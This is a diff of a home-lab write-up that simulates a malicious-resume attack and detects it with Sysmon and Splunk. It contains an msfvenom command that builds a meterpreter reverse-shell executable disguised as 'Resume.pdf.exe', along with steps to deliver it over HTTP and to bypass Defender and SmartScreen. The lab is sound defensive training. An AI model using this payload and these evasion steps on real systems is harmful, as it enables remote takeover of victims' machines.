@@ -14,7 +14,7 @@ Established a home lab environment utilizing VMware to simulate an attack scenar
 ### VMware Workstation Pro Setup
 VMware Workstation Pro is a type 2 hypervisor which serves to isolate and create a dedicated communication channel between the lab environments. The installation is as follows:
 
-1. Download VMware Workstation Pro, that is hosted at: [https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion](https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion).
+1. Download VMware Workstation Pro, that is hosted at: [https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion](https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion)
 
 2. Verify the executable's integrity through the File Checksums. In this case, the SHA-256 and MD5 checksums are found at the installer page.
     
@@ -29,7 +29,7 @@ VMware Workstation Pro is a type 2 hypervisor which serves to isolate and create
 
     ![SHA256 List](../../images/40-2-labs/you-give-hr-a-bad-pdf/002.png){: .popup-img }
 
-4. Proceed with the installation of VMware Workstation Pro by accepting the `End-User License Agreement`.
+4. Proceed with the installation of VMware Workstation Pro by accepting the `End-User License Agreement`
 
     ![End-User License Agreement](../../images/40-2-labs/you-give-hr-a-bad-pdf/003.png){: .popup-img }
 
@@ -52,9 +52,9 @@ VMware Workstation Pro is a type 2 hypervisor which serves to isolate and create
 ### Windows Setup
 Windows 11 is the most recent Operating System developed by Microsoft. This is the host machine which will be targeted by Kali Linux.
 
-1. Download the Windows Installation Media found at: [https://www.microsoft.com/en-us/software-download/windows11](https://www.microsoft.com/en-us/software-download/windows11).
+1. Download the Windows Installation Media found at: [https://www.microsoft.com/en-us/software-download/windows11](https://www.microsoft.com/en-us/software-download/windows11)
 
-2. During the install process, at the `Choose which media to use` section, select `ISO file`.
+2. During the install process, at the `Choose which media to use` section, select `ISO file`
 
     ![ISO File](../../images/40-2-labs/you-give-hr-a-bad-pdf/007.png){: .popup-img }
 
@@ -80,13 +80,13 @@ Windows 11 is the most recent Operating System developed by Microsoft. This is t
 
     ![Host-only Network Connection](../../images/40-2-labs/you-give-hr-a-bad-pdf/012.png){: .popup-img }
 
-6. Finish the machine creation and click on `Power on this virtual machine`.
+6. Finish the machine creation and click on `Power on this virtual machine`
 
-7. During the configuration process, make sure to select `I don't have a product key`.
+7. During the configuration process, make sure to select `I don't have a product key`
 
     ![Product Key](../../images/40-2-labs/you-give-hr-a-bad-pdf/013.png){: .popup-img }
 
-    In addition, select Windows 11 Pro, because of the `RDP` feature explained here: [https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/remote-desktop-supported-config](https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/remote-desktop-supported-config).
+    In addition, select Windows 11 Pro, because of the `RDP` feature explained here: [https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/remote-desktop-supported-config](https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/remote-desktop-supported-config)
 
     ![Windows 11 Pro](../../images/40-2-labs/you-give-hr-a-bad-pdf/014.png){: .popup-img }
 
@@ -100,7 +100,7 @@ Windows 11 is the most recent Operating System developed by Microsoft. This is t
 
     ![Network Connection](../../images/40-2-labs/you-give-hr-a-bad-pdf/015.png){: .popup-img }
 
-9. After the Windows setup, ensure a smoother virtualization experience by going to the `VM` tab and select `Install VMware Tools`.
+9. After the Windows setup, ensure a smoother virtualization experience by going to the `VM` tab and select `Install VMware Tools`
 
     ![VMware Tools Plug-in](../../images/40-2-labs/you-give-hr-a-bad-pdf/016.png){: .popup-img }
 
@@ -112,7 +112,7 @@ Windows 11 is the most recent Operating System developed by Microsoft. This is t
 
     ![VM Settings](../../images/40-2-labs/you-give-hr-a-bad-pdf/018.png){: .popup-img }
 
-    And, in the `Network Adapter` section choose `NAT` to ensure the VM is not alongside the host network, but has its own through the host `IP`.
+    And, in the `Network Adapter` section choose `NAT` to ensure the VM is not alongside the host network, but has its own through the host `IP`
 
     ![NAT Network Connection](../../images/40-2-labs/you-give-hr-a-bad-pdf/019.png){: .popup-img }
 
@@ -127,11 +127,15 @@ Windows 11 is the most recent Operating System developed by Microsoft. This is t
 ### Sysmon Setup
 Sysmon is a service that monitors and logs system activity. This tool will be working on the Windows VM.
 
-1. In the local machine, go to: [https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon). Then, click on `Download Sysmon`
+1. In the local machine, go to: [https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
+
+    Then, click on `Download Sysmon`
 
     ![Sysmon Download Button](../../images/40-2-labs/you-give-hr-a-bad-pdf/022.png){: .popup-img }
 
-2. Sysmon can be installed with a configuration file. The balanced approach is found at: [https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml](https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml). Right click and select `Save as`, then keep it on a memorable location.
+2. Sysmon can be installed with a configuration file. The balanced approach is found at: [https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml](https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml)
+
+    Right click and select `Save as`, then keep it on a memorable location.
 
     ![Sysmon Configuration File](../../images/40-2-labs/you-give-hr-a-bad-pdf/023.png){: .popup-img }
 
@@ -153,18 +157,20 @@ Sysmon is a service that monitors and logs system activity. This tool will be wo
 
     ![Sysmon PowerShell](../../images/40-2-labs/you-give-hr-a-bad-pdf/026.png){: .popup-img }
 
-5. To check if Sysmon is up and running, press the Windows button to search `Services`, open it and then look for `Sysmon64`.
+5. To check if Sysmon is up and running, press the Windows button to search `Services`, open it and then look for `Sysmon64`
 
     ![Sysmon Service](../../images/40-2-labs/you-give-hr-a-bad-pdf/027.png){: .popup-img }
 
-    Also, at the `Event Viewer`, Sysmon can be found via `Applications and Services Logs` -> `Microsoft` -> `Windows` -> `Sysmon`.
+    Also, at the `Event Viewer`, Sysmon can be found via `Applications and Services Logs` -> `Microsoft` -> `Windows` -> `Sysmon`
 
     ![Sysmon Event Viewer](../../images/40-2-labs/you-give-hr-a-bad-pdf/028.png){: .popup-img }
 
 ### Splunk Setup
 Splunk is a Security Information and Event Management (SIEM) tool for searching, monitoring and analyzing machines' data. This solution will be working on the Windows VM.
 
-1. In the local machine go to: [https://www.splunk.com/en_us/download/splunk-enterprise.html](https://www.splunk.com/en_us/download/splunk-enterprise.html). It requires an account to try the tool for 60 days.
+1. In the local machine go to: [https://www.splunk.com/en_us/download/splunk-enterprise.html](https://www.splunk.com/en_us/download/splunk-enterprise.html)
+
+    It requires an account to try the tool for 60 days.
     
     In this case, you may use a temporary email with: [https://temp-mail.org](https://temp-mail.org), which could serve as a workaround everytime Splunk is tested out.
 
@@ -174,7 +180,7 @@ Splunk is a Security Information and Event Management (SIEM) tool for searching,
 
     ![Splunk Download Button](../../images/40-2-labs/you-give-hr-a-bad-pdf/030.png){: .popup-img }
 
-    Also, the integrity of the executable can be checked in the same way as the third step of the VMware Setup. Retrieve the hash by clicking on `More` and then on `Download SHA512 to verify your bits`.
+    Also, the integrity of the executable can be checked in the same way as the third step of the VMware Setup. Retrieve the hash by clicking on `More` and then on `Download SHA512 to verify your bits`
 
     ![Splunk SHA512](../../images/40-2-labs/you-give-hr-a-bad-pdf/031.png){: .popup-img }
 
@@ -188,17 +194,17 @@ Splunk is a Security Information and Event Management (SIEM) tool for searching,
 
 3. Execute the Splunk installer and follow the default settings. It will setup Splunk in a `Local System Account`, which is the Windows VM. 
 
-    In case, Splunk needs to oversee data across multiple machines within an Active Directory domain, change to `Domain Account`.
+    In case, Splunk needs to oversee data across multiple machines within an Active Directory domain, change to `Domain Account`
 
     ![Splunk Local System Account](../../images/40-2-labs/you-give-hr-a-bad-pdf/033.png){: .popup-img }
 
-4. Splunk is now installed and running on `http://127.0.0.1:8000/`
+4. Splunk is now installed and running on `http://127.0.0.1:8000`
 
-5. In order to log the system events data, below the `Common tasks` tab, click on `Add data`.
+5. In order to log the system events data, below the `Common tasks` tab, click on `Add data`
 
     ![Splunk Run](../../images/40-2-labs/you-give-hr-a-bad-pdf/034.png){: .popup-img }
 
-    Then, click on `Monitor`.
+    Then, click on `Monitor`
 
     ![Splunk Monitor](../../images/40-2-labs/you-give-hr-a-bad-pdf/035.png){: .popup-img }
     
@@ -206,7 +212,7 @@ Splunk is a Security Information and Event Management (SIEM) tool for searching,
 
     ![Splunk Logs](../../images/40-2-labs/you-give-hr-a-bad-pdf/036.png){: .popup-img }
 
-    Leave the default host value and click on `Create a new index`.
+    Leave the default host value and click on `Create a new index`
 
     ![Splunk Index](../../images/40-2-labs/you-give-hr-a-bad-pdf/037.png){: .popup-img }
     
@@ -218,7 +224,7 @@ Splunk is a Security Information and Event Management (SIEM) tool for searching,
 
     ![Splunk Endpoint Input Settings](../../images/40-2-labs/you-give-hr-a-bad-pdf/039.png){: .popup-img }
 
-    After that, click on `Review` and then on `Submit`.
+    After that, click on `Review` and then on `Submit`
 
     ![Splunk Success Ingestion](../../images/40-2-labs/you-give-hr-a-bad-pdf/040.png){: .popup-img }
 
@@ -230,11 +236,11 @@ Splunk is a Security Information and Event Management (SIEM) tool for searching,
 
     ![Splunk Endpoint Query](../../images/40-2-labs/you-give-hr-a-bad-pdf/041.png){: .popup-img }
 
-6. Install the `Splunk Add-on for Sysmon` by going to `Apps` -> `Find More Apps`.
+6. Install the `Splunk Add-on for Sysmon` by going to `Apps` -> `Find More Apps`
 
     ![Splunk Find More Apps](../../images/40-2-labs/you-give-hr-a-bad-pdf/042.png){: .popup-img }
 
-    Then, look for `Sysmon` -> Click on `Install`.
+    Then, look for `Sysmon` -> Click on `Install`
 
     ![Splunk Sysmon Add-on](../../images/40-2-labs/you-give-hr-a-bad-pdf/043.png){: .popup-img }
 
@@ -280,7 +286,7 @@ Splunk is a Security Information and Event Management (SIEM) tool for searching,
 
     There are blacklisted event IDs, which reduces the noise from routine scanning or operational information. The following are the details:
 
-    - **Windows Defender:** Based on the [Official Microsoft Defender Documentation](https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus).
+    - **Windows Defender:** Based on the [Official Microsoft Defender Documentation](https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus)
 
         - **1000:** An antimalware scan started.
         - **1001:** An antimalware scan finished.
@@ -289,14 +295,14 @@ Splunk is a Security Information and Event Management (SIEM) tool for searching,
         - **1151:** Endpoint Protection client health report.
         - **2000:** The antimalware definitions updated successfully.
 
-    - **Powershell:** Based on [S0cm0nkey’s Security Reference Guide](https://s0cm0nkey.gitbook.io/s0cm0nkeys-security-reference-guide/blue-defense/event-detection/detection-use-cases/windows-event-id-logging-list) and [MyEventLog](https://www.myeventlog.com/find).
+    - **Powershell:** Based on [S0cm0nkey’s Security Reference Guide](https://s0cm0nkey.gitbook.io/s0cm0nkeys-security-reference-guide/blue-defense/event-detection/detection-use-cases/windows-event-id-logging-list) and [MyEventLog](https://www.myeventlog.com/find)
 
         - **4105:** Script Block Execution start.
         - **4106:** Script Block Execution stop.
         - **40961:** PowerShell console is starting up.
         - **40962:** PowerShell console is ready for user input.
     
-        **Note:** Event ID **4104** refers to Script Block Logging, which leverages the hunting of suspicious Powershell commands. This is a better approach than relying on events **4105** and **4106**, that may cause noisy logs. For further reference: [Malware Archeology](https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/5ba3dc87e79c703f9bfff29a/1537465479833/Windows+PowerShell+Logging+Cheat+Sheet+ver+Sept+2018+v2.2.pdf) and [Black Hills Information Security](https://www.blackhillsinfosec.com/powershell-logging-blue-team/).
+        **Note:** Event ID **4104** refers to Script Block Logging, which leverages the hunting of suspicious Powershell commands. This is a better approach than relying on events **4105** and **4106**, that may cause noisy logs. For further reference: [Malware Archeology](https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/5ba3dc87e79c703f9bfff29a/1537465479833/Windows+PowerShell+Logging+Cheat+Sheet+ver+Sept+2018+v2.2.pdf) and [Black Hills Information Security](https://www.blackhillsinfosec.com/powershell-logging-blue-team)
 
     After setting the mentioned configuration, restart the `Splunkd Service`, as shown in the image below.
 
@@ -305,7 +311,7 @@ Splunk is a Security Information and Event Management (SIEM) tool for searching,
 ### Kali Linux Setup
 Kali Linux is a Debian-based Linux distribution which is commonly used for penetration testing. Since this scenario is more focused on defense, the VM will be taken from a pre-built configuration.
 
-1. Download the Kali Linux pre-built VM found at: [https://www.kali.org/get-kali/#kali-virtual-machines](https://www.kali.org/get-kali/#kali-virtual-machines).
+1. Download the Kali Linux pre-built VM found at: [https://www.kali.org/get-kali/#kali-virtual-machines](https://www.kali.org/get-kali/#kali-virtual-machines)
 
     ![Kali Linux Pre-built VM](../../images/40-2-labs/you-give-hr-a-bad-pdf/046.png){: .popup-img }
 
@@ -321,7 +327,7 @@ Kali Linux is a Debian-based Linux distribution which is commonly used for penet
 
     ![Kali Linux Extraction](../../images/40-2-labs/you-give-hr-a-bad-pdf/049.png){: .popup-img }
 
-4. In order to load the pre-built VM, go to `File` -> `Open...`.
+4. In order to load the pre-built VM, go to `File` -> `Open...`
 
     ![Kali Linux Loading](../../images/40-2-labs/you-give-hr-a-bad-pdf/050.png){: .popup-img }
 
@@ -329,7 +335,7 @@ Kali Linux is a Debian-based Linux distribution which is commonly used for penet
 
     ![Kali Linux .vmx](../../images/40-2-labs/you-give-hr-a-bad-pdf/051.png){: .popup-img }
 
-5. Before powering up the VM, ensure that it is compatible with the actual VMware version. Therefore, click on the VM, and then on `Upgrade this virtual machine`.
+5. Before powering up the VM, ensure that it is compatible with the actual VMware version. Therefore, click on the VM, and then on `Upgrade this virtual machine`
 
     ![Kali Linux Upgrade](../../images/40-2-labs/you-give-hr-a-bad-pdf/052.png){: .popup-img }
 
@@ -341,7 +347,7 @@ Kali Linux is a Debian-based Linux distribution which is commonly used for penet
 
     ![Kali Linux Alteration](../../images/40-2-labs/you-give-hr-a-bad-pdf/054.png){: .popup-img }
 
-8. Review the changes and click on `Finish`.
+8. Review the changes and click on `Finish`
 
     ![Kali Linux Review](../../images/40-2-labs/you-give-hr-a-bad-pdf/055.png){: .popup-img }
 
@@ -353,13 +359,13 @@ Kali Linux is a Debian-based Linux distribution which is commonly used for penet
 
     ![Kali Linux Shared Folders](../../images/40-2-labs/you-give-hr-a-bad-pdf/057.png){: .popup-img }
 
-    Also, at the `Guest Isolation` section, uncheck the boxes `Enable drag and drop` and `Enable copy and paste`.
+    Also, at the `Guest Isolation` section, uncheck the boxes `Enable drag and drop` and `Enable copy and paste`
 
     ![Kali Linux Shared Folders](../../images/40-2-labs/you-give-hr-a-bad-pdf/058.png){: .popup-img }
 
-    To save the changes, click on `OK`.
+    To save the changes, click on `OK`
 
-10. After that, power on the VM and login with the default credentials `kali/kali`.
+10. After that, power on the VM and login with the default credentials `kali/kali`
 
     ![Kali Linux Login](../../images/40-2-labs/you-give-hr-a-bad-pdf/059.png){: .popup-img }
 
@@ -375,7 +381,7 @@ Kali Linux is a Debian-based Linux distribution which is commonly used for penet
     
     In this case, it points to the official Kali repository at the `kali-rolling` branch, which is a continuous stable version. 
     
-    If the latest fixed version is needed, may refer to the `kali-last-snapshot` branch at [Kali Branches](https://www.kali.org/docs/general-use/kali-branches).
+    If the latest fixed version is needed, may refer to the `kali-last-snapshot` branch at [Kali Branches](https://www.kali.org/docs/general-use/kali-branches)
 
     Now, run the command below to check for available package updates:
 
@@ -400,7 +406,7 @@ To minimize security risks, the network must be segmented and isolated from the 
 
 1. Go to any VM Settings, then on Network Adapter find the option `LAN Segments...`
     
-    Click on `Add` and set a name to the LAN segment, such as `Test`.
+    Click on `Add` and set a name to the LAN segment, such as `Test`
 
     ![Network Test Segment](../../images/40-2-labs/you-give-hr-a-bad-pdf/063.png){: .popup-img }
 
@@ -412,15 +418,15 @@ To minimize security risks, the network must be segmented and isolated from the 
 
 2. The following are the steps for the Windows Host network setup:
 
-    **2.1.** Right click on the Internet icon and select `Network and Internet settings`.
+    **2.1.** Right click on the Internet icon and select `Network and Internet settings`
 
     ![Windows Internet Icon](../../images/40-2-labs/you-give-hr-a-bad-pdf/065.png){: .popup-img }
 
-    **2.2.** Then, click on `Advanced network settings`.
+    **2.2.** Then, click on `Advanced network settings`
 
     ![Windows Advanced Network Settings](../../images/40-2-labs/you-give-hr-a-bad-pdf/066.png){: .popup-img }
 
-    **2.3.** Now, click on the accordion called `Ethernet0` and then on the edit button of `More adapter options`.
+    **2.3.** Now, click on the accordion called `Ethernet0` and then on the edit button of `More adapter options`
 
     ![Windows More Adapter Options](../../images/40-2-labs/you-give-hr-a-bad-pdf/067.png){: .popup-img }
 
@@ -432,7 +438,9 @@ To minimize security risks, the network must be segmented and isolated from the 
     
     In this case, the IP address `10.0.0.1` mimics the way workloads might be setup in any cloud provider, as it is a class A within the private IP range.
 
-    The number of hosts is limited by the subnet mask, that is `255.255.255.252`. Consequently, a total of 2 hosts are allowed for this lab.
+    The number of hosts is limited by the subnet mask, that is `255.255.255.252`
+    
+    Consequently, a total of 2 hosts are allowed for this lab.
 
     ![Windows IP and Subnet Mask](../../images/40-2-labs/you-give-hr-a-bad-pdf/069.png){: .popup-img }
 
@@ -476,7 +484,7 @@ To minimize security risks, the network must be segmented and isolated from the 
 
 5. Also, the Remote Desktop Protocol must be enabled in the Windows host, as there must be reverse shell capabilities for the Kali Linux machine.
 
-    Go to the Windows settings, then on `System` and find `Remote Desktop`.
+    Go to the Windows settings, then on `System` and find `Remote Desktop`
 
     ![Windows RDP Finding](../../images/40-2-labs/you-give-hr-a-bad-pdf/078.png){: .popup-img }
 
@@ -490,7 +498,7 @@ A reverse shell on the Windows host will be setup, involving tools like Nmap, MS
 ### Reconnaissance
 Nmap is a free and open source utility for network mapping and security auditing. This tool is being used to scan the Windows host open ports. This helps to find gaps for allowing access and communication with the victim.
 
-1. Nmap provides a manual to guide its use and capabilities. To show it, open a terminal in Kali Linux and execute `nmap -h`.
+1. Nmap provides a manual to guide its use and capabilities. To show it, open a terminal in Kali Linux and execute `nmap -h`
 
     ![Nmap Help](../../images/40-2-labs/you-give-hr-a-bad-pdf/080.png){: .popup-img }
 
@@ -511,7 +519,7 @@ Nmap is a free and open source utility for network mapping and security auditing
 ### Weaponization
 MSFvenom is a Metasploit utility for generating payloads, shellcodes, and exploits. This tool is being used to create the reverse shell payload, allowing remote access control on the victim's device. Alongside, Msfconsole will be used to listen on a predefined port.
 
-1. Msfvenom has a manual which can be looked at, by simply typing `msfvenom -h`.
+1. Msfvenom has a manual which can be looked at, by simply typing `msfvenom -h`
 
     ![Msfvenom Help](../../images/40-2-labs/you-give-hr-a-bad-pdf/082.png){: .popup-img }
 
@@ -533,11 +541,11 @@ MSFvenom is a Metasploit utility for generating payloads, shellcodes, and exploi
     msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.0.0.2 lport=4444 -f exe -o Resume.pdf.exe
     ```
 
-    ![Msfvenom Payload Creation](../../images/40-2-labs/you-give-hr-a-bad-pdf/085.png){: .popup-img }
-
     Where `-p` specifies the payload, `lhost` establishes the listening machine IP, `lport` sets the listening port, `-f` defines the format, and `-o` saves the payload into the file `Resume.pdf.exe`
 
-    The file was saved in the path `/home/kali/`. It can be moved to a more convenient place like `/home/kali/Desktop/`
+    ![Msfvenom Payload Creation](../../images/40-2-labs/you-give-hr-a-bad-pdf/085.png){: .popup-img }
+
+    The file was saved in the path `/home/kali`. It can be moved to a more convenient place like `/home/kali/Desktop`
 
     ![Msfvenom File Location](../../images/40-2-labs/you-give-hr-a-bad-pdf/086.png){: .popup-img }
 
@@ -569,7 +577,7 @@ MSFvenom is a Metasploit utility for generating payloads, shellcodes, and exploi
 
     ![Msfconsole Correct Options](../../images/40-2-labs/you-give-hr-a-bad-pdf/093.png){: .popup-img }
 
-    Finally, execute `exploit` to start listening in port `4444`.
+    Finally, execute `exploit` to start listening in port `4444`
 
     ![Msfconsole Exploit Listening](../../images/40-2-labs/you-give-hr-a-bad-pdf/094.png){: .popup-img }
 
@@ -578,7 +586,7 @@ Python HTTP Server is an utility for serving content over a network. This tool i
 
 1. In order to display the malicious file, execute the following command:
 
-    ```bash
+    ```powershell
     python3 -m http.server 9999
     ```
 
@@ -588,11 +596,11 @@ Python HTTP Server is an utility for serving content over a network. This tool i
 
 2. It is possible to disable Windows Defender. Although, there is an easier approach, that is adding a folder as exclusion, in this case, the `Downloads` folder.
 
-    To do it, go to `Windows Security`, then `Virus & threat protection`, and below the section `Virus & threat protection settings` click on `Manage settings`.
+    To do it, go to `Windows Security`, then `Virus & threat protection`, and below the section `Virus & threat protection settings` click on `Manage settings`
 
     ![Windows Security Panel](../../images/40-2-labs/you-give-hr-a-bad-pdf/096.png){: .popup-img }
     
-    After that, scroll down and click on `Add or remove exclusions`.
+    After that, scroll down and click on `Add or remove exclusions`
 
     ![Windows Security Exclusions](../../images/40-2-labs/you-give-hr-a-bad-pdf/097.png){: .popup-img }
 
@@ -608,7 +616,7 @@ Python HTTP Server is an utility for serving content over a network. This tool i
 
     ![SmartScreen Pop-up](../../images/40-2-labs/you-give-hr-a-bad-pdf/100.png){: .popup-img }
 
-    To skip the protection, click on the three dots `...` and select `Keep`.
+    To skip the protection, click on the three dots `...` and select `Keep`
 
     ![SmartScreen Keep File](../../images/40-2-labs/you-give-hr-a-bad-pdf/101.png){: .popup-img }
 
@@ -633,7 +641,7 @@ Since a Metasploit payload is being used, the exploitation, installation and C2 
     
     This explains how hashes work, any minor variation made to a file, its hash changes completely, preventing detection in open-source Threat Intelligence databases.
 
-3. Now, double click on the `Resume.pdf.exe`. When the SmartScreen warning shows up, click on `Run`.
+3. Now, double click on the `Resume.pdf.exe`. When the SmartScreen warning shows up, click on `Run`
 
     ![Malicious File Execution](../../images/40-2-labs/you-give-hr-a-bad-pdf/106.png){: .popup-img }
 
@@ -661,7 +669,7 @@ This section explores the current malware execution and the related logs within 
 
 ### Windows Findings
 
-1. The connection to the attacker machine can be reviewed in CMD as Administrator with the command `netstat -anob`.
+1. The connection to the attacker machine can be reviewed in CMD as Administrator with the command `netstat -anob`
 
     The parameter `-a` displays all active connections and listening ports, `-n` shows addresses and ports in numeric format, `-o` retrieves the Process ID (PID) for each connection, and `-b` reveals the executable that initiated the connection.
 
@@ -693,7 +701,9 @@ This section explores the current malware execution and the related logs within 
 
     ![Event Viewer Logs](../../images/40-2-labs/you-give-hr-a-bad-pdf/114.png){: .popup-img }
 
-    To do that, go to the right panel, click on `Filter Current Log...`, then go to the `XML` tab, enable the box `Edit query manually` and modify the query as follows:
+    To do that, go to the right panel, click on `Filter Current Log...`
+    
+    Then go to the `XML` tab, enable the box `Edit query manually` and modify the query as follows:
 
     ```xml
     <QueryList>
